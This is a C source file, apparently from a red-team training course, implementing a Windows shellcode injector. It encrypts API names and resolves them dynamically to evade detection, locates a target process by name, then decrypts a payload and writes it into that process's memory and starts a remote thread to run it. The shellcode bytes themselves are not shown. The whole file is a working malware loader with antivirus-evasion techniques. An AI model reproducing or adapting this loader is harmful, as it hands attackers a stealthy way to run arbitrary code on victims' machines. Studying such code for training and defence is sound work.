/*

 Red Team Operator course code template
 classic code injection
 
 author: reenz0h (twitter: @SEKTOR7net)
 modified by: geobour98

*/
#include <winternl.h>
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tlhelp32.h>
#include <wincrypt.h>
#include "obfuscate.h"
#include "helpers.h"
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")

// VCmigrate shellcode - 32-bit
unsigned char key[] = { 0xe7, 0xfd, 0xb2, 0xc1, 0xd9, 0xd6, 0x66, 0x3b, 0x94, 0xb2, 0xd0, 0x56, 0x99, 0x96, 0x69, 0x8f };
unsigned char snotepad[] = { 0x2, 0x12, 0xba, 0x84, 0x3, 0x78, 0x6e, 0xd, 0xfb, 0x99, 0xe1, 0x1e, 0xd8, 0x2f, 0x30, 0xcd };
unsigned char sCloseHandle[] = { 0x7b, 0xa1, 0xae, 0xa5, 0x76, 0xbf, 0x65, 0xab, 0x26, 0x95, 0xe6, 0x3a, 0xb, 0x16, 0xad, 0xc8 };
unsigned char sCreateToolhelp32Snapshot[] = { 0x85, 0xbd, 0x53, 0x51, 0x16, 0xe, 0x78, 0xb1, 0x4f, 0x4c, 0x6f, 0xd9, 0xd, 0x43, 0xc3, 0x14, 0x2a, 0x8, 0x79, 0x16, 0xaa, 0xa8, 0xf1, 0xf, 0xd7, 0x73, 0x89, 0x8c, 0x47, 0xda, 0x8b, 0xee };
unsigned char sProcess32First[] = { 0xc4, 0x3b, 0xe4, 0x7f, 0x13, 0x8d, 0xd9, 0x5b, 0xb8, 0xa1, 0xad, 0x51, 0x40, 0xc8, 0xca, 0x2e };
unsigned char sProcess32Next[] = { 0xbc, 0xc5, 0xf0, 0xd5, 0x81, 0x49, 0x56, 0x59, 0xc1, 0xd1, 0x22, 0xd0, 0x25, 0x69, 0xc5, 0x41 };
unsigned char slstrcmpiA[] = { 0xce, 0xbb, 0x1b, 0xb2, 0x16, 0x1e, 0x59, 0x68, 0xd7, 0xc2, 0xf, 0xd2, 0xf8, 0xd4, 0x20, 0x82 };
unsigned char sVirtualAllocEx[] = { 0xd5, 0xa1, 0xbb, 0xf9, 0x79, 0xaa, 0xcb, 0xf8, 0xbe, 0x1f, 0xdc, 0x18, 0xd6, 0x77, 0xa6, 0xf8 };
unsigned char sWriteProcessMemory[] = { 0x9b, 0xcd, 0x4a, 0xa2, 0xa6, 0xf0, 0xa4, 0x1b, 0x85, 0x71, 0xfd, 0xab, 0xf8, 0xca, 0x5b, 0x75, 0x7b, 0xe, 0x59, 0xdd, 0xfc, 0x1d, 0xb9, 0xd0, 0xc7, 0xf5, 0xe2, 0x34, 0xef, 0x7b, 0xf2, 0xea };
unsigned char sNtCreateThreadEx[] = { 0xc3, 0x54, 0xb7, 0x24, 0xb6, 0xe7, 0x1e, 0xbc, 0x89, 0xe9, 0xf3, 0x87, 0x79, 0xc7, 0x78, 0x18, 0x6d, 0xb3, 0x99, 0x80, 0x4e, 0x3f, 0xe0, 0x5, 0x4e, 0x94, 0x15, 0x83, 0x9d, 0x69, 0xea, 0xbb };
unsigned char sWaitForSingleObjectEx[] = { 0xb5, 0xd3, 0xe3, 0xcc, 0xf5, 0x7c, 0xd0, 0xd5, 0xff, 0xe, 0xf, 0xe6, 0x34, 0x8, 0xbb, 0x17, 0x52, 0x91, 0xd4, 0x14, 0xe0, 0x56, 0x59, 0xdf, 0x8, 0xc0, 0x11, 0x6e, 0xf4, 0xb1, 0x1c, 0xcd };
unsigned char sOpenProcess[] = { 0xff, 0xb8, 0xe1, 0x7d, 0xc9, 0x69, 0x7f, 0x4b, 0x4e, 0xdb, 0x14, 0x68, 0x98, 0xc3, 0x28, 0xde };
unsigned int payload_len = sizeof(payload);


// http://undocumented.ntinternals.net/UserMode/Undocumented%20Functions/Executable%20Images/RtlCreateUserThread.html
typedef struct _CLIENT_ID {
	HANDLE 			UniqueProcess;
	HANDLE 			UniqueThread;
} CLIENT_ID, *PCLIENT_ID;

typedef LPVOID (WINAPI * VirtualAllocEx_t)(
	HANDLE 			hProcess,
	LPVOID 			lpAddress,
	SIZE_T 			dwSize,
	DWORD  			flAllocationType,
	DWORD  			flProtect
);

typedef BOOL (WINAPI * WriteProcessMemory_t)(
	HANDLE  		hProcess,
	LPVOID  		lpBaseAddress,
	LPCVOID 		lpBuffer,
	SIZE_T  		nSize,
	SIZE_T  		*lpNumberOfBytesWritte
);

typedef NTSTATUS (NTAPI * NtCreateThreadEx_t)(
	OUT PHANDLE 	hThread,
	IN ACCESS_MASK 	DesiredAccess,
	IN PVOID 		ObjectAttributes,
	IN HANDLE 		ProcessHandle,
	IN PVOID 		lpStartAddress,
	IN PVOID 		lpParameter,
	IN ULONG 		Flags,
	IN SIZE_T 		StackZeroBits,
	IN SIZE_T 		SizeOfStackCommit,
	IN SIZE_T 		SizeOfStackReserve,
	OUT PVOID 		lpBytesBuffer
);

typedef DWORD (WINAPI * WaitForSingleObjectEx_t)(
	HANDLE 			hHandle,
	DWORD  			dwMilliseconds,
	BOOL   			bAlertable
);

typedef BOOL (WINAPI * CloseHandle_t)(
	HANDLE			hObject
);

typedef HANDLE (WINAPI * CreateToolhelp32Snapshot_t)(
	DWORD			dwFlags,
	DWORD			th32ProcessID
);

typedef BOOL (WINAPI * Process32First_t)(
	HANDLE			 hSnapshot,
	LPPROCESSENTRY32 lppe
);

typedef BOOL (WINAPI * Process32Next_t)(
	HANDLE			 hSnapshot,
	LPPROCESSENTRY32 lppe
);

typedef VOID (WINAPI * RtlMoveMemory_t)(
	VOID UNALIGNED *Destination, 
	const VOID UNALIGNED *Source, 
	SIZE_T Length
);

typedef INT (WINAPI * lstrcmpiA_t)(
	LPCSTR			lpString1,
	LPCSTR			lpString2
);

typedef HANDLE (WINAPI * OpenProcess_t)(
	DWORD			dwDesiredAccess,
	BOOL			bInherithandle,
	DWORD			dwProcessId
);

typedef BOOL (WINAPI * CryptAcquireContextW_t)(
	HCRYPTPROV 		*phProv,
	LPCWSTR     	szContainer,
	LPCWSTR     	szProvider,
	DWORD      		dwProvType,
	DWORD      		dwFlags
);

typedef BOOL (WINAPI * CryptCreateHash_t)(
	HCRYPTPROV 		hProv,
	ALG_ID     		Algid,
	HCRYPTKEY  		hKey,
	DWORD      		dwFlags,
	HCRYPTHASH 		*phHash
);

typedef BOOL (WINAPI * CryptHashData_t)(
	HCRYPTHASH 		hHash,
	const BYTE 		*pbData,
	DWORD      		dwDataLen,
	DWORD      		dwFlags
);

typedef BOOL (WINAPI * CryptDeriveKey_t)(
	HCRYPTPROV 		hProv,
	ALG_ID     		Algid,
	HCRYPTHASH 		hBaseData,
	DWORD      		dwFlags,
	HCRYPTKEY  		*phKey
);

typedef BOOL (WINAPI * CryptDecrypt_t)(
	HCRYPTKEY  		hKey,
	HCRYPTHASH 		hHash,
	BOOL       		Final,
	DWORD      		dwFlags,
	BYTE       		*pbData,
	DWORD      		*pdwDataLen
);

typedef BOOL (WINAPI * CryptReleaseContext_t)(
	HCRYPTPROV 		hProv,
	DWORD      		dwFlags
);

typedef BOOL (WINAPI * CryptDestroyHash_t)(
	HCRYPTHASH 		hHash
);

typedef BOOL (WINAPI * CryptDestroyKey_t)(
	HCRYPTKEY 		hKey
);


// https://gist.github.com/jsxinvivo/11f383ac61a56c1c0c25
wchar_t * convertCharArrayToLPCWSTR(char* charArray)
{
    wchar_t * wString = new wchar_t[4096];
    MultiByteToWideChar(CP_ACP, 0, charArray, -1, wString, 4096);
    return wString;
}

wchar_t * obfNtdll  		   = convertCharArrayToLPCWSTR(AY_OBFUSCATE("NTDLL.DLL"));
wchar_t * obfKernel 		   = convertCharArrayToLPCWSTR(AY_OBFUSCATE("KERNEL32.DLL"));
wchar_t * obfAdvapi 		   = convertCharArrayToLPCWSTR(AY_OBFUSCATE("ADVAPI32.DLL"));

char * sCryptAcquireContextW   = AY_OBFUSCATE("CryptAcquireContextW");
char * sCryptCreateHash 	   = AY_OBFUSCATE("CryptCreateHash");
char * sCryptHashData 		   = AY_OBFUSCATE("CryptHashData");
char * sCryptDeriveKey 		   = AY_OBFUSCATE("CryptDeriveKey");
char * sCryptDecrypt 		   = AY_OBFUSCATE("CryptDecrypt");
char * sCryptReleaseContext    = AY_OBFUSCATE("CryptReleaseContext");
char * sCryptDestroyHash 	   = AY_OBFUSCATE("CryptDestroyHash");
char * sCryptDestroyKey 	   = AY_OBFUSCATE("CryptDestroyKey");


int AESDecrypt(char * payload, unsigned int payload_len, char * key, size_t keylen) {
	HCRYPTPROV hProv;
	HCRYPTHASH hHash;
	HCRYPTKEY hKey;
	
	CryptAcquireContextW_t pCryptAcquireContextW = (CryptAcquireContextW_t) hlpGetProcAddress(hlpGetModuleHandle(obfAdvapi), sCryptAcquireContextW);
	CryptCreateHash_t pCryptCreateHash = (CryptCreateHash_t) hlpGetProcAddress(hlpGetModuleHandle(obfAdvapi), sCryptCreateHash);
	CryptHashData_t pCryptHashData = (CryptHashData_t) hlpGetProcAddress(hlpGetModuleHandle(obfAdvapi), sCryptHashData);
	CryptDeriveKey_t pCryptDeriveKey = (CryptDeriveKey_t) hlpGetProcAddress(hlpGetModuleHandle(obfAdvapi), sCryptDeriveKey);
	CryptDecrypt_t pCryptDecrypt = (CryptDecrypt_t) hlpGetProcAddress(hlpGetModuleHandle(obfAdvapi), sCryptDecrypt);
	CryptReleaseContext_t pCryptReleaseContext = (CryptReleaseContext_t) hlpGetProcAddress(hlpGetModuleHandle(obfAdvapi), sCryptReleaseContext);
	CryptDestroyHash_t pCryptDestroyHash = (CryptDestroyHash_t) hlpGetProcAddress(hlpGetModuleHandle(obfAdvapi), sCryptDestroyHash);
	CryptDestroyKey_t pCryptDestroyKey = (CryptDestroyKey_t) hlpGetProcAddress(hlpGetModuleHandle(obfAdvapi), sCryptDestroyKey);

	if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)){
			return -1;
	}
	if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)){
			return -1;
	}
	if (!CryptHashData(hHash, (BYTE*) key, (DWORD) keylen, 0)){
			return -1;              
	}
	if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0,&hKey)){
			return -1;
	}
	
	if (!CryptDecrypt(hKey, (HCRYPTHASH) NULL, 0, 0, (BYTE *) payload, (DWORD *) &payload_len)){
			return -1;
	}
	
	CryptReleaseContext(hProv, 0);
	CryptDestroyHash(hHash);
	CryptDestroyKey(hKey);
	
	return 0;
}


int FindTarget(const char *procname) {

	HANDLE hProcSnap;
	PROCESSENTRY32 pe32;
	int pid = 0;

	CreateToolhelp32Snapshot_t pCreateToolhelp32Snapshot = (CreateToolhelp32Snapshot_t) hlpGetProcAddress(hlpGetModuleHandle(obfKernel), (char *) sCreateToolhelp32Snapshot);
	Process32First_t pProcess32First = (Process32First_t) hlpGetProcAddress(hlpGetModuleHandle(obfKernel), (char *) sProcess32First);
	CloseHandle_t pCloseHandle = (CloseHandle_t) hlpGetProcAddress(hlpGetModuleHandle(obfKernel), (char *) sCloseHandle);
	Process32Next_t pProcess32Next = (Process32Next_t) hlpGetProcAddress(hlpGetModuleHandle(obfKernel), (char *) sProcess32Next);
	lstrcmpiA_t plstrcmpiA = (lstrcmpiA_t) hlpGetProcAddress(hlpGetModuleHandle(obfKernel), (char *) slstrcmpiA);
	
	hProcSnap = pCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (INVALID_HANDLE_VALUE == hProcSnap) return 0;
                
	pe32.dwSize = sizeof(PROCESSENTRY32); 
                
	if (!pProcess32First(hProcSnap, &pe32)) {
		pCloseHandle(hProcSnap);
		return 0;
	}
                
	while (pProcess32Next(hProcSnap, &pe32)) {
		if (plstrcmpiA(procname, pe32.szExeFile) == 0) {
			pid = pe32.th32ProcessID;
			break;
		}
	}
                
	pCloseHandle(hProcSnap);
                
	return pid;
}


// thread context injection
int tcInject(HANDLE hProc, unsigned char * payload, unsigned int payload_len) {

	LPVOID pRemoteCode = NULL;
	HANDLE hThread = NULL;
	CLIENT_ID cid;

	VirtualAllocEx_t pVirtualAllocEx = (VirtualAllocEx_t) hlpGetProcAddress(hlpGetModuleHandle(obfKernel), (char *) sVirtualAllocEx);
	WriteProcessMemory_t pWriteProcessMemory = (WriteProcessMemory_t) hlpGetProcAddress(hlpGetModuleHandle(obfKernel), (char *) sWriteProcessMemory);
	NtCreateThreadEx_t pNtCreateThreadEx = (NtCreateThreadEx_t) hlpGetProcAddress(hlpGetModuleHandle(obfNtdll), (char *) sNtCreateThreadEx);
	WaitForSingleObjectEx_t pWaitForSingleObjectEx = (WaitForSingleObjectEx_t) hlpGetProcAddress(hlpGetModuleHandle(obfKernel), (char *) sWaitForSingleObjectEx);
	CloseHandle_t pCloseHandle = (CloseHandle_t) hlpGetProcAddress(hlpGetModuleHandle(obfKernel), (char *) sCloseHandle);

	// Decrypt payload
	AESDecrypt((char *) payload, payload_len, (char *) key, sizeof(key));

	pRemoteCode = pVirtualAllocEx(hProc, NULL, payload_len, MEM_COMMIT, PAGE_EXECUTE_READ);
	pWriteProcessMemory(hProc, pRemoteCode, (PVOID) payload, (SIZE_T) payload_len, (SIZE_T *) NULL);
	
	pNtCreateThreadEx(&hThread, GENERIC_ALL, NULL, hProc, (LPTHREAD_START_ROUTINE) pRemoteCode, NULL, NULL, NULL, NULL, NULL, NULL);
	if (hThread != NULL) {
			pWaitForSingleObjectEx(hThread, 500, TRUE);
			pCloseHandle(hThread);
			return 0;
	}
	return -1;
}

void AESDecryptString() {
	AESDecrypt((char *) snotepad, sizeof(snotepad), (char *) key, sizeof(key));
	AESDecrypt((char *) sCloseHandle, sizeof(sCloseHandle), (char *) key, sizeof(key));
	AESDecrypt((char *) sCreateToolhelp32Snapshot, sizeof(sCreateToolhelp32Snapshot), (char *) key, sizeof(key));
	AESDecrypt((char *) sProcess32First, sizeof(sProcess32First), (char *) key, sizeof(key));
	AESDecrypt((char *) sProcess32Next, sizeof(sProcess32Next), (char *) key, sizeof(key));
	AESDecrypt((char *) slstrcmpiA, sizeof(slstrcmpiA), (char *) key, sizeof(key));
	AESDecrypt((char *) sVirtualAllocEx, sizeof(sVirtualAllocEx), (char *) key, sizeof(key));
	AESDecrypt((char *) sWriteProcessMemory, sizeof(sWriteProcessMemory), (char *) key, sizeof(key));
	AESDecrypt((char *) sNtCreateThreadEx, sizeof(sNtCreateThreadEx), (char *) key, sizeof(key));
	AESDecrypt((char *) sWaitForSingleObjectEx, sizeof(sWaitForSingleObjectEx), (char *) key, sizeof(key));
	AESDecrypt((char *) sOpenProcess, sizeof(sOpenProcess), (char *) key, sizeof(key));
}


int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd) {
    
	int pid = 0;
    HANDLE hProc = NULL;
	
	AESDecryptString();
	
	OpenProcess_t pOpenProcess = (OpenProcess_t) hlpGetProcAddress(hlpGetModuleHandle(obfKernel), (char *) sOpenProcess);
	CloseHandle_t pCloseHandle = (CloseHandle_t) hlpGetProcAddress(hlpGetModuleHandle(obfKernel), (char *) sCloseHandle);
	
	pid = FindTarget((char *) snotepad);

	if (pid) {
		// try to open target process
		hProc = pOpenProcess( PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | 
						PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE,
						FALSE, (DWORD) pid);

		if (hProc != NULL) {
			tcInject(hProc, payload, payload_len);
			pCloseHandle(hProc);
		}
	}
	return 0;
}